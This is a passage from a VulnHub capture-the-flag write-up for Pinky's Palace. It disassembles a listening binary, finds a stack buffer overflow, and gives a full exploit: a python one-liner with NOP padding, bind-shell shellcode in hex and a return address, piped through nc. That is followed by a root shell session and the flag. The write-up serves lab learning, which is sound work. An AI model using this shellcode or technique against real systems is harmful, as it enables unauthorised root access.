  [19] .fini_array       FINI_ARRAY       0000000000601e10  00001e10
       0000000000000008  0000000000000008  WA       0     0     8
  [20] .jcr              PROGBITS         0000000000601e18  00001e18
       0000000000000008  0000000000000000  WA       0     0     8
  [21] .dynamic          DYNAMIC          0000000000601e20  00001e20
       00000000000001d0  0000000000000010  WA       6     0     8
  [22] .got              PROGBITS         0000000000601ff0  00001ff0
       0000000000000010  0000000000000008  WA       0     0     8
  [23] .got.plt          PROGBITS         0000000000602000  00002000
       0000000000000098  0000000000000008  WA       0     0     8
  [24] .data             PROGBITS         0000000000602098  00002098
       0000000000000010  0000000000000000  WA       0     0     8
  [25] .bss              NOBITS           00000000006020a8  000020a8
       0000000000000008  0000000000000000  WA       0     0     1
  [26] .comment          PROGBITS         0000000000000000  000020a8
       000000000000002d  0000000000000001  MS       0     0     1
  [27] .symtab           SYMTAB           0000000000000000  000020d8
       0000000000000780  0000000000000018          28    46     8
  [28] .strtab           STRTAB           0000000000000000  00002858
       00000000000002fe  0000000000000000           0     0     1
  [29] .shstrtab         STRTAB           0000000000000000  00002b56
       0000000000000108  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)

There are no section groups in this file.

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000400040 0x0000000000400040
                 0x00000000000001f8 0x00000000000001f8  R E    0x8
  INTERP         0x0000000000000238 0x0000000000400238 0x0000000000400238
                 0x000000000000001c 0x000000000000001c  R      0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
                 0x0000000000000e4c 0x0000000000000e4c  R E    0x200000
  LOAD           0x0000000000001e08 0x0000000000601e08 0x0000000000601e08
                 0x00000000000002a0 0x00000000000002a8  RW     0x200000
  DYNAMIC        0x0000000000001e20 0x0000000000601e20 0x0000000000601e20
                 0x00000000000001d0 0x00000000000001d0  RW     0x8
  NOTE           0x0000000000000254 0x0000000000400254 0x0000000000400254
                 0x0000000000000044 0x0000000000000044  R      0x4
  GNU_EH_FRAME   0x0000000000000cd4 0x0000000000400cd4 0x0000000000400cd4
                 0x0000000000000044 0x0000000000000044  R      0x4
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RWE    0x10
  GNU_RELRO      0x0000000000001e08 0x0000000000601e08 0x0000000000601e08
                 0x00000000000001f8 0x00000000000001f8  R      0x1

 Section to Segment mapping:
  Segment Sections...
   00     
   01     .interp 
   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame 
   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss 
   04     .dynamic 
   05     .note.ABI-tag .note.gnu.build-id 
   06     .eh_frame_hdr 
   07     
   08     .init_array .fini_array .jcr .dynamic .got 

Dynamic section at offset 0x1e20 contains 24 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000c (INIT)               0x400718
 0x000000000000000d (FINI)               0x400c04
 0x0000000000000019 (INIT_ARRAY)         0x601e08
 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x601e10
 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
 0x000000006ffffef5 (GNU_HASH)           0x400298
 0x0000000000000005 (STRTAB)             0x400480
 0x0000000000000006 (SYMTAB)             0x4002b8
 0x000000000000000a (STRSZ)              158 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x602000
 0x0000000000000002 (PLTRELSZ)           384 (bytes)
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000017 (JMPREL)             0x400598
 0x0000000000000007 (RELA)               0x400568
 0x0000000000000008 (RELASZ)             48 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000006ffffffe (VERNEED)            0x400548
 0x000000006fffffff (VERNEEDNUM)         1
 0x000000006ffffff0 (VERSYM)             0x40051e
 0x0000000000000000 (NULL)               0x0

Relocation section '.rela.dyn' at offset 0x568 contains 2 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000601ff0  000a00000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0
000000601ff8  000b00000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0

Relocation section '.rela.plt' at offset 0x598 contains 16 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000602018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 recv@GLIBC_2.2.5 + 0
000000602020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 strcpy@GLIBC_2.2.5 + 0
000000602028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 setsockopt@GLIBC_2.2.5 + 0
000000602030  000400000007 R_X86_64_JUMP_SLO 0000000000000000 strlen@GLIBC_2.2.5 + 0
000000602038  000500000007 R_X86_64_JUMP_SLO 0000000000000000 htons@GLIBC_2.2.5 + 0
000000602040  000600000007 R_X86_64_JUMP_SLO 0000000000000000 send@GLIBC_2.2.5 + 0
000000602048  000700000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
000000602050  000800000007 R_X86_64_JUMP_SLO 0000000000000000 memset@GLIBC_2.2.5 + 0
000000602058  000900000007 R_X86_64_JUMP_SLO 0000000000000000 close@GLIBC_2.2.5 + 0
000000602060  000c00000007 R_X86_64_JUMP_SLO 0000000000000000 listen@GLIBC_2.2.5 + 0
000000602068  000d00000007 R_X86_64_JUMP_SLO 0000000000000000 bind@GLIBC_2.2.5 + 0
000000602070  000e00000007 R_X86_64_JUMP_SLO 0000000000000000 accept@GLIBC_2.2.5 + 0
000000602078  000f00000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0
000000602080  001000000007 R_X86_64_JUMP_SLO 0000000000000000 wait@GLIBC_2.2.5 + 0
000000602088  001100000007 R_X86_64_JUMP_SLO 0000000000000000 fork@GLIBC_2.2.5 + 0
000000602090  001200000007 R_X86_64_JUMP_SLO 0000000000000000 socket@GLIBC_2.2.5 + 0

The decoding of unwind sections for machine type Advanced Micro Devices X86-64 is not currently supported.

Symbol table '.dynsym' contains 19 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND recv@GLIBC_2.2.5 (2)
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strcpy@GLIBC_2.2.5 (2)
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setsockopt@GLIBC_2.2.5 (2)
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.2.5 (2)
     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND htons@GLIBC_2.2.5 (2)
     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND send@GLIBC_2.2.5 (2)
     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.2.5 (2)
     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memset@GLIBC_2.2.5 (2)
     9: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND close@GLIBC_2.2.5 (2)
    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)
    11: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    12: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND listen@GLIBC_2.2.5 (2)
    13: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND bind@GLIBC_2.2.5 (2)
    14: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND accept@GLIBC_2.2.5 (2)
    15: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.2.5 (2)
    16: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND wait@GLIBC_2.2.5 (2)
    17: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fork@GLIBC_2.2.5 (2)
    18: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND socket@GLIBC_2.2.5 (2)

Symbol table '.symtab' contains 80 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000400238     0 SECTION LOCAL  DEFAULT    1 
     2: 0000000000400254     0 SECTION LOCAL  DEFAULT    2 
     3: 0000000000400274     0 SECTION LOCAL  DEFAULT    3 
     4: 0000000000400298     0 SECTION LOCAL  DEFAULT    4 
     5: 00000000004002b8     0 SECTION LOCAL  DEFAULT    5 
     6: 0000000000400480     0 SECTION LOCAL  DEFAULT    6 
     7: 000000000040051e     0 SECTION LOCAL  DEFAULT    7 
     8: 0000000000400548     0 SECTION LOCAL  DEFAULT    8 
     9: 0000000000400568     0 SECTION LOCAL  DEFAULT    9 
    10: 0000000000400598     0 SECTION LOCAL  DEFAULT   10 
    11: 0000000000400718     0 SECTION LOCAL  DEFAULT   11 
    12: 0000000000400730     0 SECTION LOCAL  DEFAULT   12 
    13: 0000000000400840     0 SECTION LOCAL  DEFAULT   13 
    14: 0000000000400c04     0 SECTION LOCAL  DEFAULT   14 
    15: 0000000000400c10     0 SECTION LOCAL  DEFAULT   15 
    16: 0000000000400cd4     0 SECTION LOCAL  DEFAULT   16 
    17: 0000000000400d18     0 SECTION LOCAL  DEFAULT   17 
    18: 0000000000601e08     0 SECTION LOCAL  DEFAULT   18 
    19: 0000000000601e10     0 SECTION LOCAL  DEFAULT   19 
    20: 0000000000601e18     0 SECTION LOCAL  DEFAULT   20 
    21: 0000000000601e20     0 SECTION LOCAL  DEFAULT   21 
    22: 0000000000601ff0     0 SECTION LOCAL  DEFAULT   22 
    23: 0000000000602000     0 SECTION LOCAL  DEFAULT   23 
    24: 0000000000602098     0 SECTION LOCAL  DEFAULT   24 
    25: 00000000006020a8     0 SECTION LOCAL  DEFAULT   25 
    26: 0000000000000000     0 SECTION LOCAL  DEFAULT   26 
    27: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    28: 0000000000601e18     0 OBJECT  LOCAL  DEFAULT   20 __JCR_LIST__
    29: 0000000000400870     0 FUNC    LOCAL  DEFAULT   13 deregister_tm_clones
    30: 00000000004008b0     0 FUNC    LOCAL  DEFAULT   13 register_tm_clones
    31: 00000000004008f0     0 FUNC    LOCAL  DEFAULT   13 __do_global_dtors_aux
    32: 00000000006020a8     1 OBJECT  LOCAL  DEFAULT   25 completed.6972
    33: 0000000000601e10     0 OBJECT  LOCAL  DEFAULT   19 __do_global_dtors_aux_fin
    34: 0000000000400910     0 FUNC    LOCAL  DEFAULT   13 frame_dummy
    35: 0000000000601e08     0 OBJECT  LOCAL  DEFAULT   18 __frame_dummy_init_array_
    36: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS panel.c
    37: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    38: 0000000000400e48     0 OBJECT  LOCAL  DEFAULT   17 __FRAME_END__
    39: 0000000000601e18     0 OBJECT  LOCAL  DEFAULT   20 __JCR_END__
    40: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS 
    41: 0000000000601e10     0 NOTYPE  LOCAL  DEFAULT   18 __init_array_end
    42: 0000000000601e20     0 OBJECT  LOCAL  DEFAULT   21 _DYNAMIC
    43: 0000000000601e08     0 NOTYPE  LOCAL  DEFAULT   18 __init_array_start
    44: 0000000000400cd4     0 NOTYPE  LOCAL  DEFAULT   16 __GNU_EH_FRAME_HDR
    45: 0000000000602000     0 OBJECT  LOCAL  DEFAULT   23 _GLOBAL_OFFSET_TABLE_
    46: 0000000000400c00     2 FUNC    GLOBAL DEFAULT   13 __libc_csu_fini
    47: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND recv@@GLIBC_2.2.5
    48: 0000000000602098     0 NOTYPE  WEAK   DEFAULT   24 data_start
    49: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strcpy@@GLIBC_2.2.5
    50: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setsockopt@@GLIBC_2.2.5
    51: 00000000006020a8     0 NOTYPE  GLOBAL DEFAULT   24 _edata
    52: 0000000000400c04     0 FUNC    GLOBAL DEFAULT   14 _fini
    53: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strlen@@GLIBC_2.2.5
    54: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND htons@@GLIBC_2.2.5
    55: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND send@@GLIBC_2.2.5
    56: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@@GLIBC_2.2.5
    57: 0000000000400964    71 FUNC    GLOBAL DEFAULT   13 handlecmd
    58: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memset@@GLIBC_2.2.5
    59: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND close@@GLIBC_2.2.5
    60: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
    61: 0000000000602098     0 NOTYPE  GLOBAL DEFAULT   24 __data_start
    62: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    63: 00000000006020a0     0 OBJECT  GLOBAL HIDDEN    24 __dso_handle
    64: 0000000000400c10     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used
    65: 0000000000400b90   101 FUNC    GLOBAL DEFAULT   13 __libc_csu_init
    66: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND listen@@GLIBC_2.2.5
    67: 00000000006020b0     0 NOTYPE  GLOBAL DEFAULT   25 _end
    68: 0000000000400840    43 FUNC    GLOBAL DEFAULT   13 _start
    69: 00000000006020a8     0 NOTYPE  GLOBAL DEFAULT   25 __bss_start
    70: 00000000004009ab   473 FUNC    GLOBAL DEFAULT   13 main
    71: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND bind@@GLIBC_2.2.5
    72: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND accept@@GLIBC_2.2.5
    73: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@@GLIBC_2.2.5
    74: 00000000006020a8     0 OBJECT  GLOBAL HIDDEN    24 __TMC_END__
    75: 0000000000400936    46 FUNC    GLOBAL DEFAULT   13 fatal
    76: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND wait@@GLIBC_2.2.5
    77: 0000000000400718     0 FUNC    GLOBAL DEFAULT   11 _init
    78: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fork@@GLIBC_2.2.5
    79: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND socket@@GLIBC_2.2.5

Version symbols section '.gnu.version' contains 19 entries:
 Addr: 000000000040051e  Offset: 0x00051e  Link: 5 (.dynsym)
  000:   0 (*local*)       2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)
  004:   2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)
  008:   2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)   0 (*local*)    
  00c:   2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)
  010:   2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)

Version needs section '.gnu.version_r' contains 1 entry:
 Addr: 0x0000000000400548  Offset: 0x000548  Link: 6 (.dynstr)
  000000: Version: 1  File: libc.so.6  Cnt: 1
  0x0010:   Name: GLIBC_2.2.5  Flags: none  Version: 2

Displaying notes found in: .note.ABI-tag
  Owner                 Data size	Description
  GNU                  0x00000010	NT_GNU_ABI_TAG (ABI version tag)
    OS: Linux, ABI: 2.6.32

Displaying notes found in: .note.gnu.build-id
  Owner                 Data size	Description
  GNU                  0x00000014	NT_GNU_BUILD_ID (unique build ID bitstring)
    Build ID: 2d568c8bce502884642e6a62b93033441b616e46
```

Hardening info:

```
panel:
 Position Independent Executable: no, normal executable!
 Stack protected: no, not found!
 Fortify Source functions: no, only unprotected functions found!
 Read-only relocations: yes
 Immediate binding: no, not found!
```

Flow of main function:

![](https://i.imgur.com/romBY73.png)

The binary creates a TCP server and listens for connections (the port is 31337, assigned here: `0x00400a37      bf697a0000     edi = 0x7a69 `). If a connection is made a text will be sent and then it waits for input. When the input is sent it just sends it back. As you might have mentioned, it appears to be the program which is listening on the box at 31337. As it says, this might be the backdoor for root.

I see that a buffer is created for the input:
```
0x00400b39      b900000000     ecx = 0
0x00400b3e      ba00100000     edx = 0x1000
0x00400b43      89c7           edi = eax
```
We see that there is no protection against too long inputs. Let's do it dynamically to get known on how to abuse that buffer overflow. I use gdb with [peda](https://github.com/longld/peda), which is a great tool to do these things.

<script src="https://asciinema.org/a/McjE8Q6CpuKxCjfF0SYhATu5e.js" id="asciicast-McjE8Q6CpuKxCjfF0SYhATu5e" async></script>

You see in that record that I created a buffer with 256 chars. I sent it via `cat buff | nc localhost 31337`. Also I set a breakpoint to the first return. I took then the first buffer of the stack and checked it's size, it is 120 bytes. So whenever something is sent with more than 120 bytes it will overflow, EBP is filled and EIP could be overwritten. We need then also a address, if we want to send a shellcode, where we push it then and let it run. This is done via jmpcall. As there is no ASLR the address is always the same. We need a `call rsp` address, which is prompted as `0x400cfb : call rsp`. This address we will append as little endian to make the program flow jump to that address and run our shellcode there.

An nice tutorial on how to find such vuln is [here](https://pinkysplanet.net/simple-linux-x86-buffer-overflow/) and [here](http://www.cs.ucr.edu/~csong/cs165/17/lab2.html).

So, we need a shellcode. Remember the length of the buffer, 120 bytes. The shellcode can be 120 bytes big, after that comes our `call rsp` address. I'm using that [shellcode](https://www.exploit-db.com/exploits/41128/). It's only 87 bytes, so small enough for our buffer. You have to fill the full 120 bytes to reach the end of `eip`. I filled it with 33 times of `NOP` (that's the `\x90`).

Exploiting:

```
root@kali:~/vulnhub/pinkypalace/panel# python -c 'print "\x90"*33 + "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05" + "\xfb\x0c\x40\x00\x00\x00"' | nc pinkydb 31337
[+] Welcome to The Daemon [+]
This is soon to be our backdoor
into Pinky's Palace.
=> ���������������������������������H1�H1�H1���j)Xj_H�jf�D$�T^Rj1XjZ^j2Xj+XH�j^�ΰ!u���RH�/bin//shSH�<$�;�
                                                                                                               @
```

Then on another CLI:

```
root@kali:~/vulnhub/pinkypalace/panel# nc -v pinkydb 5600
pinkydb [10.20.20.133] 5600 (?) open
id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux Pinkys-Palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64 GNU/Linux
cd /root
ls -al
total 24
drwx------  2 root root 4096 Mar 17  2018 .
drwxr-xr-x 25 root root 4096 Mar 17  2018 ..
lrwxrwxrwx  1 root root    9 Mar 17  2018 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
lrwxrwxrwx  1 root root    9 Mar 17  2018 .mysql_history -> /dev/null
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root 1953 Mar 17  2018 .viminfo
-rw-------  1 root root  639 Mar 17  2018 root.txt
cat root.txt

 ____  _       _          _     
|  _ \(_)_ __ | | ___   _( )___ 
| |_) | | '_ \| |/ / | | |// __|
|  __/| | | | |   <| |_| | \__ \
|_|   |_|_| |_|_|\_\\__, | |___/
                    |___/       
 ____       _                   
|  _ \ __ _| | __ _  ___ ___ 
| |_) / _` | |/ _` |/ __/ _ \
|  __/ (_| | | (_| | (_|  __/
|_|   \__,_|_|\__,_|\___\___|

[+] CONGRATS YOUVE PWND PINKYS PALACE!!!!!!                             
[+] Flag: 2208f787fcc6433b4798d2189af7424d
[+] Twitter: @Pink_P4nther
[+] Cheers to VulnHub!
[+] VM Host: VMware
[+] Type: CTF || [Realistic]
[+] Hopefully you enjoyed this and gained something from it as well!!!
exit
```

And we solved this CTF.

## Conclusion

I really enjoyed this CTF. It began rather simple and got kind hard in the end. It teached me how to use peda :grin:!

Also it shows how important it is to code securely. Not testing buffer is kinda bad thing, even more when you use it in a listening service.

So, next it Pinky's Palace v3 I think :smile:

